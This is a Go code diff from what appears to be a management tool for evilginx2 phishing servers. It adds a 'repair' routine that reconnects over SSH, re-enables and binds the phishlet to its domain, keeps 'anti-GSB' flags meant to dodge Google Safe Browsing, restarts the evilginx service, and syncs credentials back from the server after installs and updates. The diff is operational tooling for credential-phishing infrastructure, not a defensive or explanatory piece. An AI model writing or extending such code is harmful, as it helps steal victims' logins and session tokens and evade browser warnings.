@@ -245,6 +245,30 @@ func (a *App) StartUninstall(p *Profile) *Job {
 	return j
 }
 
+func (a *App) StartRepair(p *Profile) *Job {
+	j := a.newJob(p.ID, "repair")
+	go func() { j.done(a.runRepair(j, p)) }()
+	return j
+}
+
+// runRepair re-applies the essential config (phishlet bound + enabled, anti-GSB
+// flags) and restarts — used to recover an existing deployment whose config was
+// altered, without touching user data.
+func (a *App) runRepair(j *Job, p *Profile) error {
+	j.logf("repairing config on %s", p.Host)
+	c, err := dial(p, func(fp string) { a.pinHostKey(p.ID, fp) })
+	if err != nil {
+		return fmt.Errorf("%s", classifySSH(err))
+	}
+	defer c.Close()
+	a.ensureConfig(j, c, p)
+	a.syncCredsFromServer(p)
+	if _, err := jrun(j, c, "systemctl restart evilginx"); err != nil {
+		return err
+	}
+	return a.verify(j, c, p, orDefault(p.InstallDir, "/root/evilginx2"))
+}
+
 // jrun logs and runs a command, returning an error on non-zero exit.
 func jrun(j *Job, c *SSH, cmd string) (string, error) {
 	j.log("$ " + cmd)
@@ -374,6 +398,7 @@ func (a *App) runInstall(j *Job, p *Profile, opts InstallOpts) error {
 		j.log("── config.json (kept existing)")
 	}
 	a.ensureConfig(j, c, p)
+	a.syncCredsFromServer(p)
 	jrun(j, c, "touch "+shq(dir+"/cfg/blacklist.txt"))
 
 	// landing redirect page ---------------------------------------------------
@@ -454,7 +479,6 @@ func (a *App) runInstall(j *Job, p *Profile, opts InstallOpts) error {
 
 	return a.verify(j, c, p, dir)
 }
-
 func (a *App) runUpdate(j *Job, p *Profile) error {
 	j.logf("updating binary on %s", p.Host)
 	c, err := dial(p, func(fp string) { a.pinHostKey(p.ID, fp) })
@@ -479,6 +503,7 @@ func (a *App) runUpdate(j *Job, p *Profile) error {
 		return err
 	}
 	a.ensureConfig(j, c, p)
+	a.syncCredsFromServer(p)
 	if _, err := jrun(j, c, "systemctl restart evilginx"); err != nil {
 		return err
 	}
@@ -787,8 +812,15 @@ func (a *App) ensureConfig(j *Job, c *SSH, p *Profile) {
 		g = map[string]interface{}{}
 		m["general"] = g
 	}
-	if d, _ := g["domain"].(string); d == "" && p.Domain != "" {
-		g["domain"] = p.Domain
+	// the profile domain wins, but fall back to whatever the (existing) config
+	// already has so an adopted server is never left without a hostname
+	dom := strings.TrimSpace(p.Domain)
+	if dom == "" {
+		dom, _ = g["domain"].(string)
+		dom = strings.TrimSpace(dom)
+	}
+	if d, _ := g["domain"].(string); d == "" && dom != "" {
+		g["domain"] = dom
 		changed = true
 	}
 	if _, ok := g["unauth_redirect"]; !ok {
@@ -819,10 +851,10 @@ func (a *App) ensureConfig(j *Job, c *SSH, p *Profile) {
 		entry = map[string]interface{}{}
 		ph[p.Phishlet] = entry
 	}
-	if h, _ := entry["hostname"].(string); h == "" && p.Domain != "" {
-		entry["hostname"] = p.Domain
+	if h, _ := entry["hostname"].(string); h == "" && dom != "" {
+		entry["hostname"] = dom
 		changed = true
-		j.logf("config: bound phishlet '%s' to %s", p.Phishlet, p.Domain)
+		j.logf("config: bound phishlet '%s' to %s", p.Phishlet, dom)
 	}
 	if en, _ := entry["enabled"].(bool); !en {
 		entry["enabled"] = true
